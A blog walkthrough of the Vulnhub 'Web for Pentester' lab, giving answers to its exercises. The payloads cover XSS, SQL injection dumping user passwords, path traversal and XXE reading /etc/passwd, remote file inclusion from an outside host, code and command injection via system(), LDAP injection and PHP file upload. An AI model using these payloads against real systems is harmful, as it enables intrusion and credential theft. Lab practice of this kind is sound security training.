---
layout: post
title: "Vulnhub: Web for P3ntester"
categories: vulnhub
author: "dib"
permalink: /vulnhub/web-for-pentester/
tags: vulnhub
---

> "IoT without security = Internet of Threats" -- Stéphane Nappo

![][1]
![][2]

We're gonna practice one of the oldies but goodie VMs on Vulnhub, it's P3ntester Lab: Web for P3ntesters. To download this VM, click [here](https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/). Let's do all the exercises.

### 0x00 Get IP address

![][3]

<details>
  <summary>
    get VM IP address
  </summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> sudo ifconfig
[sudo] password for imd: 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.222.129  netmask 255.255.255.0  broadcast 192.168.222.255
        inet6 fe80::20c:29ff:fe30:674e  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:30:67:4e  txqueuelen 1000  (Ethernet)
        RX packets 3055  bytes 794511 (775.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 984  bytes 103982 (101.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 22  bytes 1052 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 22  bytes 1052 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

<b>imd@kali:~$</b> sudo arp-scan 192.168.222.0/24
Interface: eth0, type: EN10MB, MAC: 00:0c:29:30:67:4e, IPv4: 192.168.222.129
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.222.1	00:50:56:c0:00:08	VMware, Inc.
192.168.222.2	00:50:56:e7:41:94	VMware, Inc.
192.168.222.128	00:0c:29:ee:a3:2a	VMware, Inc.
192.168.222.254	00:50:56:ea:ab:d2	VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.124 seconds (120.53 hosts/sec). 4 responded

</pre>
</details>

Just type "ifconfig" on the machine to get its IP. or you can scan it on your machine. Victim's target IP is 192.168.222.128.

### 0x01 XSS

<details>
  <summary> XSS exercises answers</summary>

<pre>
&nbsp;
<b>Exercise 1</b>
{% highlight html %}
<script>alert('vulnerable')</script>
{% endhighlight %}

<b>Exercise 2</b>
{% highlight html %}
<Script>alert('vulnerable')</Script>
{% endhighlight %}

<b>Exercise 3</b>
{% highlight html %}
<scr<script>ipt>alert('vulnerable')</scr</script>ipt>
<svg/onload=alert('vulnerable');
{% endhighlight %}

<b>Exercise 4</b>
{% highlight html %}
<img src="null" onerror='alert("vulnerable")'/>
{% endhighlight %}

<b>Exercise 5</b>

convert ascii to dec

https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html

`<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 118, 117, 108, 110, 101, 114, 97, 98, 108, 101, 34, 41))</script>`

<b>Exercise 6</b>
{% highlight html %}
";alert('vulnerable');"
{% endhighlight %}

<b>Exercise 7</b>
{% highlight html %}
';alert('vulnerable');'
{% endhighlight %}

<b>Exercise 8</b>
{% highlight html %}/">
<script>alert('vulnerable')</script>
{% endhighlight %}

<b>Exercise 9</b>

do it preferably on internet explorer browser which is known as vulnerable on DOM based xss attack

{% highlight html %}
#hacker<script>alert('vulnerable')</script>
{% endhighlight %}

</pre>
</details>

### 0x02 SQLi

<details>
  <summary> SQLi exercises answers</summary>

<pre>
&nbsp;
<b>Exercise 1</b>
{% highlight html %}
' or 1=1-- -
' or 1=1 union all select 1,2,3,4,table_name from information_schema.tables-- -
' or 1=1 union all select 1,2,3,4,column_name from information_schema.columns-- -
{% endhighlight %}

<b>Exercise 2</b>

https://www.eso.org/~ndelmott/url_encode.html

"%09" = tab

{% highlight html %}
'%09or%091=1--%09-
'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2
{% endhighlight %}

<b>Exercise 3</b>
{% highlight html %}
'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2
{% endhighlight %}

<b>Exercise 4</b>
{% highlight html %}
or 1=1
sqlmap -u &quot;http://pentesterlab/sqli/example4.php?id=2&quot; --dbs
{% endhighlight %}

<b>Exercise 5</b>
{% highlight html %}2 or 1=1-- -{% endhighlight %}

<b>Exercise 6</b>
{% highlight html %}2 or 1=1-- -{% endhighlight %}

<b>Exercise 7</b>
{% highlight html %}%0a or 1=1{% endhighlight %}

<b>Exercise 8</b>

"%23" is hash (#) encoded

{% highlight html %}
ORDER BY ``%23 or order = name`,` name`
`%23 or order = name
{% endhighlight %}

<b>Exercise 9</b>
{% highlight html %}IF (1, name, age){% endhighlight %}

</pre>
</details>

### 0x03 Directory Traversal

<details>
  <summary>directory traversal answers</summary>

<pre>
&nbsp;
<b>Exercise 1</b>
{% highlight html %}file=../../../../etc/passwd{% endhighlight %}

<b>Exercise 2</b>>

{% highlight html %}file=/var/www/files/../../../../etc/passwd{% endhighlight %}

<b>Exercise 3</b>>

{% highlight html %}file=../../../../etc/passwd%00
file=../../../../etc/passwd%2500{% endhighlight %}

</pre>
</details>

### 0x04 File Path

<details>
  <summary>file path answers</summary>

<pre>
&nbsp;
<b>Exercise 1</b>
{% highlight html %}
page=../../../../etc/passwd
page=http://192.168.222.129/phpinfo.txt
page=http://spenneberg.org/phpinfo.txt
{% endhighlight %}

<b>Exercise 2</b>
{% highlight html %}
page=http://www.spenneberg.org/phpinfo.txt%00
{% endhighlight %}

</pre>
</details>

### 0x05 Code Injection

<details>
  <summary>code injection answers</summary>

<pre>
&nbsp;
<b>Exercise 1</b>
decoded url to ascii:
hacker ".system ('hostname'); #
{% highlight html %}
name=hacker".system('whoami')%3B%23
name=hacker%22.system(%27hostname%27)%3B%23
{% endhighlight %}

<b>Exercise 2</b>
{% highlight html %}
order=id)%3B}system('cat /etc/passwd')%3B%23
{% endhighlight %}

<b>Exercise 3</b>
{% highlight html %}
pattern=/[0-9]/e&new=system('cat /etc/passwd')&base=1
{% endhighlight %}

<b>Exercise 4</b>
{% highlight html %}
name=hacker'.system('cat /etc/passwd')%3B%23
name=hacker'.system('cat /etc/passwd').'
{% endhighlight %}

</pre>
</details>

### 0x06 Command Injection

<details>
  <summary>command injection answers</summary>

<pre>
&nbsp;  
<b>Exercise 1</b>
{% highlight html %}
ip=127.0.0.1;id
{% endhighlight %}

<b>Exercise 2</b>
{% highlight html %}
ip=127.0.0.1%0Aid
{% endhighlight %}

<b>Exercise 3</b>
{% highlight html %}
GET /commandexec/example3.php?ip=127.0.0.1|cat+/etc/passwd HTTP/1.0
{% endhighlight %}

</pre>
</details>

### 0x07 LDAP Attacks

<details>
  <summary>LDAP attacks answers</summary>

<pre>
&nbsp;
<b>Exercise 1</b>
{% highlight html %}
just remove '?username=hacker&password=hacker'
{% endhighlight %}

<b>Exercise 2</b>
{% highlight html %}
name=hacker)(cn=*))%00&password=test
{% endhighlight %}

</pre>
</details>

### 0x08 File Upload

<details>
  <summary>file upload answers</summary>

<pre>
&nbsp;
<b>Exercise 1</b>
{% highlight html %}
echo "<?php phpinfo(); ?>" > phpinfo.php
/upload/images/phpinfo.php
{% endhighlight %}


<b>Exercise 2</b>
{% highlight html %}
echo "<?php phpinfo(); ?>" > phpinfo.php.text
/upload/images/phpinfo.php.test
{% endhighlight %}

</pre>
</details>

### 0x09 XML Attacks

<details>
  <summary>xml attack answers</summary>

<pre>
&nbsp;
<b>Exercise 1</b>
{% highlight html %}
xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM "file%3A%2f%2f%2fetc%2fpasswd">]><test>%26xxe%3B<%2ftest>
{% endhighlight %}

<b>Exercise 2</b>
{% highlight html %}
name=' or 1=1]%00
{% endhighlight %}

</pre>
</details>


[1]: https://i.imgur.com/3xNv7Vl.png
[2]: https://i.imgur.com/L7aKp5g.png
[3]: https://i.imgur.com/WcRI3QW.png